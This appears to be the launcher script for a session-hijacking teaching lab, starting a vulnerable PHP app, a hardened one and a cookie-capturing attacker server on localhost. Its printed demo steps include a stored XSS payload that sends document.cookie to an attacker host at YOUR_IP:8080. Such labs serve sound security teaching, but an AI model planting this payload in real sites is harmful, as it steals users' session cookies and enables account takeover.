#!/usr/bin/env bash
# =====================================================================
# Session Hijacking Lab — Setup & Launcher
# ---------------------------------------------------------------------
# Starts three PHP built-in servers for the demo:
#   - Vulnerable app  : http://localhost:8001
#   - Secure app      : http://localhost:8002
#   - CookieCatcher   : http://localhost:8080  (attacker receiver)
#
# RUN ONLY in an isolated lab/VM. Requires PHP 7.4+ (php -v).
# Usage:  bash setup.sh        (Ctrl+C to stop everything)
# =====================================================================
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

# --- Check PHP is available ---
if ! command -v php >/dev/null 2>&1; then
    echo "[!] PHP not found. Install it first:  sudo apt install php-cli -y"
    exit 1
fi
echo "[*] Using $(php -v | head -n1)"

# --- Reset previous demo state ---
rm -f "$ROOT/vulnerable-app/comments.txt" \
      "$ROOT/secure-app/comments.txt" \
      "$ROOT/attacker/captured_cookies.log" 2>/dev/null || true

# --- Helper to start a server in the background ---
start() {
    local name="$1" port="$2" docroot="$3" router="${4:-}"
    echo "[*] Starting $name on http://localhost:$port"
    if [ -n "$router" ]; then
        php -S "0.0.0.0:$port" -t "$docroot" "$docroot/$router" \
            > "/tmp/${name}.log" 2>&1 &
    else
        php -S "0.0.0.0:$port" -t "$docroot" > "/tmp/${name}.log" 2>&1 &
    fi
    echo $! >> /tmp/sh_lab_pids
}

: > /tmp/sh_lab_pids

start "vulnerable" 8001 "$ROOT/vulnerable-app"
start "secure"     8002 "$ROOT/secure-app"
start "attacker"   8080 "$ROOT/attacker" "cookiecatcher.php"

cat <<EOF

=====================================================================
  LAB IS RUNNING
=====================================================================
  Vulnerable app : http://localhost:8001
  Secure app     : http://localhost:8002
  CookieCatcher  : http://localhost:8080   (dashboard of captures)

  DEMO STEPS
  ----------
  1. Find your IP:        hostname -I
  2. Open the vulnerable app and post this comment (replace IP):
       <img src=x onerror="this.src='http://YOUR_IP:8080/?c='+document.cookie">
  3. Reload the vulnerable app -> cookie appears in the CookieCatcher
     dashboard at http://localhost:8080
  4. Repeat on the SECURE app (port 8002) -> capture is EMPTY / blocked.

  Press Ctrl+C to stop all servers.
=====================================================================
EOF

# --- Clean shutdown on Ctrl+C ---
trap 'echo; echo "[*] Stopping servers..."; xargs kill < /tmp/sh_lab_pids 2>/dev/null || true; rm -f /tmp/sh_lab_pids; exit 0' INT TERM

# Keep the script alive while servers run
wait
